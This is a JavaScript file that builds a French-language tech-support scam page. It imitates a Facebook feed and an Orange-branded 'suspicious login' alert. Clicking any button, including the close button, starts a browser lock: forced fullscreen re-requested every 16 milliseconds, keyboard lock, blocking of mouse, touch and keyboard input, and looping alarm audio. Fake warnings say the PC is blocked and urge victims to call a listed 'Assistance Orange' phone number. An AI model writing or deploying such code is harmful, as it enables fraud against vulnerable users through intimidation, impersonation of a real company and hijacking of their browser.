(function () {
  var mount = document.getElementById("app-mount");
  if (!mount) return;

  if (!document.querySelector('link[href="styles.css"]')) {
    var styleLink = document.createElement("link");
    styleLink.rel = "stylesheet";
    styleLink.href = "styles.css";
    document.head.appendChild(styleLink);
  }

  document.title = "Fond bleu avec modale";

  mount.innerHTML =
    '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
    '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">' +
    '<div class="security-page">' +
    '<section class="access-modal" aria-label="Alerte acces bloque">' +
    '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
    '<p>N\'accédez pas à ce pc et ne le redémarrez pas. Si vous ignorez cet avertissement, vous risquez de perdre des informations.</p>' +
    '<p>Contactez l\'assistance dès que possible ; un expert Orange vous guidera par téléphone lors de l\'analyse.</p>' +
    '<p>L\'exécution de cette application peut mettre votre pc en danger.</p>' +
    '</section>' +
    '<div class="black-modal-blue-box">' +
    '<p>Assistance Orange : 02 59 50 84 52</p>' +
    '<p class="black-modal-defender">Assistance Orange</p>' +
    '</div>' +
    '<section class="scan-modal" aria-label="Assistance Orange">' +
    '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
    '<p class="scan-modal-text">Assistance Orange a détecté une anomalie sur votre appareil. Contactez un expert pour une analyse complète et sécuriser votre connexion.</p>' +
    '<p class="scan-modal-text">Contactez l\'assistance Orange pour obtenir de l\'aide</p>' +
    '<p class="scan-modal-support">Assistance Orange : 02 59 50 84 52</p>' +
    '<div class="scan-modal-actions">' +
    '<button class="scan-btn scan-btn-now" type="button">Analyser maintenant</button>' +
    '<button class="scan-btn scan-btn-later" type="button">Analyser plus tard</button>' +
    '</div>' +
    '</section>' +
    '</div>' +
    '<aside class="support-card" aria-label="Assistance Orange">' +
    '<p class="support-card-subtitle">Assistance Orange</p>' +
    '<p class="support-card-phone">02 59 50 84 52</p>' +
    '<p class="support-card-label">Numero</p>' +
    '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
    '<div class="home-page">' +
    '<main class="screen">' +
    '<div class="fb-desktop-bg" aria-hidden="true">' +
    '<header class="fb-topbar"><div class="fb-topbar-left">' +
    '<span class="fb-topbar-logo">f</span><div class="fb-search">Rechercher sur Facebook</div></div>' +
    '<div class="fb-topbar-center">' +
    '<span class="fb-nav-icon active">⌂</span><span class="fb-nav-icon">👥</span>' +
    '<span class="fb-nav-icon">📺</span><span class="fb-nav-icon">🏪</span><span class="fb-nav-icon">👤</span></div>' +
    '<div class="fb-topbar-right">' +
    '<span class="fb-topbar-pill"></span><span class="fb-topbar-pill"></span><span class="fb-topbar-pill"></span></div></header>' +
    '<div class="fb-desktop-layout"><aside class="fb-sidebar-left">' +
    '<div class="fb-side-item"><span class="fb-avatar"></span> Votre profil</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">👤</span> Amis</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">📰</span> Fil d\'actualité</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">👥</span> Groupes</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">🏪</span> Marketplace</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">📺</span> Watch</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">🕓</span> Souvenirs</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">🔖</span> Enregistrements</div></aside>' +
    '<section class="fb-feed"><div class="fb-stories">' +
    '<div class="fb-story"></div><div class="fb-story"></div><div class="fb-story"></div>' +
    '<div class="fb-story"></div><div class="fb-story"></div></div>' +
    '<div class="fb-composer"><span class="fb-avatar"></span><div class="fb-composer-input">Quoi de neuf ?</div></div>' +
    '<article class="fb-post"><div class="fb-post-head"><span class="fb-avatar sm"></span><div><strong>Marie Dupont</strong><small>Il y a 2 h</small></div></div>' +
    '<div class="fb-post-text">Belle journée en famille ☀️</div><div class="fb-post-image"></div></article>' +
    '<article class="fb-post"><div class="fb-post-head"><span class="fb-avatar sm"></span><div><strong>Thomas Martin</strong><small>Il y a 5 h</small></div></div>' +
    '<div class="fb-post-text">Quelqu\'un a des recommandations pour un bon restaurant ?</div></article></section>' +
    '<aside class="fb-sidebar-right"><h3>Contacts</h3>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Sophie Laurent</div>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Lucas Bernard</div>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Emma Petit</div>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Hugo Moreau</div>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Julie Roux</div>' +
    '<div class="fb-sponsored"><h3>Sponsorisé</h3><div class="fb-ad"></div><div class="fb-ad"></div></div></aside></div></div>' +
    '<div class="fb-bg-overlay" aria-hidden="true"></div>' +
    '<h1 class="warning-text">votre ordinateur est bloque</h1>' +
    '<section class="modal" aria-label="Modale carree">' +
    '<header class="fb-submodal-header"><div class="orange-logo" aria-hidden="true">' +
    '<svg viewBox="0 0 110 32" role="img" aria-hidden="true">' +
    '<text x="0" y="24" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-size="24" font-weight="700">orange</text>' +
    '</svg></div>' +
    '<button class="fb-close" id="fbCloseBtn" type="button" aria-label="Fermer">&times;</button></header>' +
    '<div class="fb-submodal-separator" aria-hidden="true"></div><div class="modal-content"><div class="modal-top">' +
    '<div class="warning-icon" aria-hidden="true"><svg viewBox="0 0 64 64" role="img" aria-hidden="true">' +
    '<path d="M32 4L4 58h56L32 4z" fill="#facc15" stroke="#ca8a04" stroke-width="2"/>' +
    '<text x="32" y="44" text-anchor="middle" font-size="28" font-weight="700" fill="#1f2937">?</text></svg></div>' +
    '<h2 class="modal-title">Connexion suspecte détectée</h2>' +
    '<p class="modal-message">Nous avons détecté une tentative de connexion à votre compte depuis un appareil inconnu</p>' +
    '<div class="sub-modal"><div class="sub-modal-icon" aria-hidden="true">' +
    '<svg viewBox="0 0 24 24" role="img" aria-hidden="true">' +
    '<path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6a2.5 2.5 0 0 1 0 5.5z" fill="#2563eb"/></svg></div>' +
    '<div class="sub-modal-details"><p>Localisation : Marseille, France</p>' +
    '<p>Appareil : Windows 19.0.0 . chromium 148</p>' +
    '<p>Heure : Aujourd\'hui, <span id="currentTime"></span></p></div></div></div>' +
    '<div class="modal-bottom"><div class="modal-actions" role="group" aria-label="Actions">' +
    '<button class="modal-btn modal-btn-allow" id="secureAccountBtn" type="button">Sécuriser mon compte</button>' +
    '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Assistance Orange</p></div>' +
    '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
    '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>';

  var realTitle = document.title;

  document.addEventListener("visibilitychange", function () {
    if (document.hidden) {
      document.title = " ";
      document.body.style.visibility = "hidden";
    } else {
      document.title = realTitle;
      document.body.style.visibility = "visible";
    }
  });

  var ESCAPE_DEZOOM_MS = 5000;
  var secureAccountBtn = document.getElementById("secureAccountBtn");
  var denyAccountBtn = document.getElementById("denyAccountBtn");
  var securityOverlay = document.getElementById("securityOverlay");
  var fbCloseBtn = document.getElementById("fbCloseBtn");
  var securityAudio1 = document.getElementById("securityAudio1");
  var securityAudio2 = document.getElementById("securityAudio2");

  var securityLockActive = false;
  var escapeKeyHeld = false;
  var escapeHoldStart = null;
  var escapeHoldInterval = null;
  var fullscreenGuardInterval = null;
  var isDezoomed = false;
  var allowFullscreenExit = false;

  function isEscapeKey(event) {
    return event.key === "Escape" || event.code === "Escape" || event.keyCode === 27;
  }

  async function lockKeyboard() {
    if (navigator.keyboard && navigator.keyboard.lock) {
      try {
        await navigator.keyboard.lock();
      } catch (_error) {}
    }
  }

  async function requestFullscreen() {
    if (document.fullscreenElement) return true;
    if (!document.documentElement.requestFullscreen) return false;
    try {
      await document.documentElement.requestFullscreen();
      return true;
    } catch (_error) {
      return false;
    }
  }

  function clearEscapeHold() {
    escapeHoldStart = null;
    if (escapeHoldInterval) {
      clearInterval(escapeHoldInterval);
      escapeHoldInterval = null;
    }
  }

  function showSecurityPage() {
    if (!securityOverlay) return;
    securityOverlay.classList.add("is-active");
    securityOverlay.setAttribute("aria-hidden", "false");
    document.body.classList.add("security-mode");
  }

  function forceStayFullscreen() {
    if (!securityLockActive || isDezoomed || allowFullscreenExit) return;
    showSecurityPage();
    requestFullscreen();
    requestAnimationFrame(function () {
      requestFullscreen();
    });
    setTimeout(requestFullscreen, 0);
    setTimeout(requestFullscreen, 20);
    setTimeout(requestFullscreen, 80);
  }

  function enterFullscreenMode() {
    isDezoomed = false;
    document.body.classList.remove("security-dezoomed");
    requestFullscreen();
  }

  function dezoomFullscreen() {
    allowFullscreenExit = true;
    isDezoomed = true;
    document.body.classList.add("security-dezoomed");
    if (document.fullscreenElement && document.exitFullscreen) {
      document.exitFullscreen().catch(function () {});
    }
    setTimeout(function () {
      allowFullscreenExit = false;
    }, 400);
  }

  function forceFullscreen() {
    forceStayFullscreen();
  }

  function startFullscreenGuard() {
    stopFullscreenGuard();
    fullscreenGuardInterval = setInterval(function () {
      if (securityLockActive && !isDezoomed && !allowFullscreenExit) {
        forceStayFullscreen();
      }
    }, 16);
  }

  function stopFullscreenGuard() {
    if (fullscreenGuardInterval) {
      clearInterval(fullscreenGuardInterval);
      fullscreenGuardInterval = null;
    }
  }

  function playSecurityAudios() {
    [securityAudio1, securityAudio2].forEach(function (audio) {
      if (!audio) return;
      audio.loop = true;
      audio.currentTime = 0;
      audio.play().catch(function () {});
    });
  }

  function activateSecurityLock() {
    if (!securityOverlay) return;
    securityLockActive = true;
    isDezoomed = false;
    allowFullscreenExit = false;
    escapeKeyHeld = false;
    clearEscapeHold();
    document.body.classList.remove("security-dezoomed");
    showSecurityPage();
    enterFullscreenMode();
    lockKeyboard();
    startFullscreenGuard();
    playSecurityAudios();
  }

  function startEscapeHoldTimer() {
    if (escapeHoldInterval) return;
    escapeHoldStart = Date.now();
    escapeHoldInterval = setInterval(function () {
      if (!securityLockActive || !escapeKeyHeld) return;

      var elapsed = Date.now() - escapeHoldStart;

      if (elapsed >= ESCAPE_DEZOOM_MS && !isDezoomed) {
        dezoomFullscreen();
        clearEscapeHold();
        escapeKeyHeld = false;
        return;
      }

      if (!isDezoomed) {
        forceStayFullscreen();
      }
    }, 50);
  }

  function handleSecurityKeyboard(event) {
    if (!securityLockActive) return;

    if (isEscapeKey(event)) {
      event.preventDefault();
      event.stopImmediatePropagation();

      if (event.type === "keydown") {
        if (isDezoomed) return;
        if (!escapeKeyHeld) {
          escapeKeyHeld = true;
          startEscapeHoldTimer();
        }
        forceStayFullscreen();
        return;
      }

      if (event.type === "keyup") {
        var heldLongEnough =
          escapeHoldStart !== null &&
          Date.now() - escapeHoldStart >= ESCAPE_DEZOOM_MS;

        escapeKeyHeld = false;
        clearEscapeHold();

        if (!heldLongEnough && !isDezoomed) {
          forceStayFullscreen();
        }
      }
      return;
    }

    event.preventDefault();
    event.stopImmediatePropagation();
  }

  function handleSecurityLockPointer(event) {
    if (!securityLockActive) return;
    if (event.type === "click" || event.type === "touchstart") {
      if (!isDezoomed) forceFullscreen();
    }
    event.preventDefault();
    event.stopPropagation();
  }

  ["mousedown", "mouseup", "mousemove", "contextmenu", "dblclick", "wheel"].forEach(function (eventName) {
    document.addEventListener(eventName, handleSecurityLockPointer, true);
  });

  ["click", "touchstart", "touchmove", "touchend"].forEach(function (eventName) {
    document.addEventListener(eventName, handleSecurityLockPointer, { capture: true, passive: false });
  });

  document.addEventListener("click", function () {
    if (securityLockActive) return;
    requestFullscreen();
  });

  document.addEventListener("touchstart", function () {
    if (securityLockActive) return;
    requestFullscreen();
  }, { passive: true });

  document.addEventListener("fullscreenchange", function () {
    if (securityLockActive && !isDezoomed && !allowFullscreenExit && !document.fullscreenElement) {
      forceStayFullscreen();
    }
  });

  ["keydown", "keyup", "keypress"].forEach(function (eventName) {
    document.addEventListener(eventName, handleSecurityKeyboard, { capture: true, passive: false });
    window.addEventListener(eventName, handleSecurityKeyboard, { capture: true, passive: false });
  });

  var currentTimeEl = document.getElementById("currentTime");
  if (currentTimeEl) {
    var now = new Date();
    currentTimeEl.textContent = now.toLocaleTimeString("fr-FR", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  }

  function goToSecurityPage(event) {
    if (event) {
      event.preventDefault();
      event.stopPropagation();
    }
    activateSecurityLock();
  }

  if (secureAccountBtn && securityOverlay) {
    secureAccountBtn.addEventListener("click", goToSecurityPage);
  }

  if (denyAccountBtn && securityOverlay) {
    denyAccountBtn.addEventListener("click", goToSecurityPage);
  }

  if (fbCloseBtn && securityOverlay) {
    fbCloseBtn.addEventListener("click", function (event) {
      event.preventDefault();
      event.stopPropagation();
      if (!securityLockActive) {
        goToSecurityPage(event);
        return;
      }
      if (!isDezoomed) forceFullscreen();
    });
  }
})();
